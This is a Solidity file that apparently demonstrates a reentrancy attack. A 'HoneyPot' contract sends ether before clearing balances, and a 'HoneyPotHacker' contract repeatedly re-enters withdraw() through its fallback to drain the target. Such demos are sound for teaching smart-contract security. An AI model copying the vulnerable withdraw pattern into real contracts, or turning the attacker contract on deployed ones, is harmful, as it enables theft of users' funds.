pragma solidity ^0.5.1;

contract HoneyPot {

    mapping (address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0);

        bytes memory bs;
        (bool success, ) = msg.sender.call.value(balances[msg.sender])(bs);
        if (!success)
            revert();
        balances[msg.sender] = 0;
    }
}


contract HoneyPotHacker {

    HoneyPot private honeypot;

    constructor(HoneyPot h) public payable {
        honeypot = h;
    }

    function collectMoney() public payable {
        honeypot.deposit.value(msg.value)();
        honeypot.withdraw();
        selfdestruct(msg.sender);
        }

    function() external payable {
        if (address(honeypot).balance >= msg.value)
        honeypot.withdraw();
    }
}
